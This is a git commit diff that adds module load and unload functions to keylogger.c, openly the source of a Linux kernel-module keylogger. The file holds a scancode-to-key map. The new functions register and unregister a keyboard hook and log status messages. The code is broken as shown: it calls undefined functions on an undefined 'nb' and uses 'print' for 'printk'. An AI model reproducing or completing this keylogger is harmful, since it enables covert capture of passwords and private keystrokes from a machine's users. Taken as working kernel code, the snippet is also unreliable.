8d4bd0440ae2352374db240301c65b4cbc9b3506
shangsuru <helm.henry99@gmail.com>
2022-02-01 03:28:18 -0500

    implement functions for loading and unloading the module

--- keylogger.c
+++ keylogger.c
@@ -1,3 +1,7 @@
+#include <linux/module.h>
+#include <linux/kernel.h>
+
+
 static const char* keymap[] = {
 	"\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
 	"-", "=", "_BACKSPACE_", "_TAB_", "q", "w", "e", "r", "t", "y",
@@ -5,3 +9,14 @@ static const char* keymap[] = {
 	"f", "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z",
 	"x", "c", "v", "b", "n", "m", ",", "."
 };
+
+static int __init startup(void) {
+	register_keylogger(&nb);
+	printk(KERN_INFO "Loaded keylogger!\n");
+	return 0;
+}
+
+static void __exit shutdown(void) {
+	unregister_keylogger(&nb);
+	print(KERN_INFO "Keylogger unloaded!\n");
+}
